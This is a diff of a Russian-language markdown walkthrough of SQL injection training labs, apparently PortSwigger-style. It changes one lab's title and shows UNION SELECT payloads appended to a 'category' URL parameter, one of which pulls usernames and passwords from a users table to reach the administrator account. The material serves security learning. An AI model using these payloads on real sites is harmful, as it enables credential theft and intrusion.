@@ -22,10 +22,11 @@
   2. category=Accessories' UNION SELECT NULL, '0OmNnF', 1 --
   3. Успех
 
-<b>Lab: SQL injection UNION attack, finding a column containing text</b>
+<b>Lab: SQL injection UNION attack, retrieving data from other tables</b>
   1. Используем уязвимость к union атакам 
   2. Прибавляем к url сategory=Corporate+gifts' UNION SELECT username, password FROM users --
   3. В строках с описанием находим пароль администратора
   4. Вставляем это в форму
   5. Успех
-  ![alt text](https://raw.githubusercontent.com/StonePardon/Hack_all_the_things/master/SQL/mmm_admin.png)
+ 
+ ![alt text](https://raw.githubusercontent.com/StonePardon/Hack_all_the_things/master/SQL/mmm_admin.png)
